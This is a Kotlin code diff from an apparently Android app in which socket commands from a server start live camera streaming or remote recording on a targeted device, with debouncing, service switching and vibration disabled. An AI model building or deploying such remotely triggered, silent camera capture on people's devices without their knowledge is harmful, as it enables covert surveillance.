@@ -19,6 +19,8 @@ object SocketManager {
     private var isConnecting = false
     private var currentServerUrl: String? = null
     private var heartbeatThread: Thread? = null
+    private var lastLiveStreamCmdTime = 0L
+    private var lastRecordCmdTime = 0L
 
     fun isConnected(): Boolean {
         return socket?.connected() == true
@@ -103,13 +105,32 @@ object SocketManager {
                     if (!targetDeviceId.isNullOrEmpty() && targetDeviceId != myDeviceId) {
                         return@on
                     }
+                    val now = System.currentTimeMillis()
+                    if (now - lastLiveStreamCmdTime < 1000L) {
+                        Log.d(TAG, "Ignoring duplicate start-live-stream within 1s")
+                        return@on
+                    }
+                    lastLiveStreamCmdTime = now
+
                     val camera = data?.optString("camera", "BACK") ?: "BACK"
                     Log.i(TAG, " Received START live stream command (Lens: $camera)")
-                    if (!CameraRecordingService.isServiceRunning) {
-                        LiveStreamService.startService(context, camera)
-                    } else {
-                        Log.w(TAG, "🎥 Video recording is actively running (#1 Top Priority). Live stream request ignored to protect video recording.")
+
+                    val wasRecordingRunning = CameraRecordingService.isServiceRunning
+                    if (wasRecordingRunning) {
+                        Log.i(TAG, "🎥 CameraRecordingService was running. Gracefully stopping recording to switch to live stream.")
+                        CameraRecordingService.stopService(context, enableVibration = false)
                     }
+
+                    Thread {
+                        try {
+                            if (wasRecordingRunning) {
+                                Thread.sleep(350)
+                            }
+                        } catch (e: Exception) {
+                            // ignore
+                        }
+                        LiveStreamService.startService(context, camera)
+                    }.start()
                 } catch (e: Exception) {
                     Log.e(TAG, "Error handling start-live-stream", e)
                 }
@@ -157,6 +178,13 @@ object SocketManager {
                     if (!targetDeviceId.isNullOrEmpty() && targetDeviceId != myDeviceId) {
                         return@on
                     }
+                    val now = System.currentTimeMillis()
+                    if (now - lastRecordCmdTime < 1000L) {
+                        Log.d(TAG, "Ignoring duplicate start-remote-recording within 1s")
+                        return@on
+                    }
+                    lastRecordCmdTime = now
+
                     val camera = data?.optString("camera", "BACK") ?: "BACK"
                     val lens = if (camera.equals("FRONT", ignoreCase = true)) "FRONT" else "BACK"
                     prefs.cameraLens = lens
@@ -164,17 +192,24 @@ object SocketManager {
 
                     // Stop LiveStreamService first to cleanly release camera & mic hardware
                     val wasLiveRunning = LiveStreamService.isServiceRunning
-                    LiveStreamService.stopService(context)
+                    if (wasLiveRunning) {
+                        LiveStreamService.stopService(context)
+                    }
 
                     Thread {
                         try {
                             if (wasLiveRunning) {
-                                Thread.sleep(250)
+                                Thread.sleep(350)
                             }
                         } catch (e: Exception) {
                             // ignore
                         }
-                        CameraRecordingService.startService(context, enableVibration = false, cameraLens = lens)
+                        CameraRecordingService.startService(
+                            context = context,
+                            enableVibration = false,
+                            cameraLens = lens,
+                            isRemote = true
+                        )
                     }.start()
                 } catch (e: Exception) {
                     Log.e(TAG, "Error starting remote recording", e)
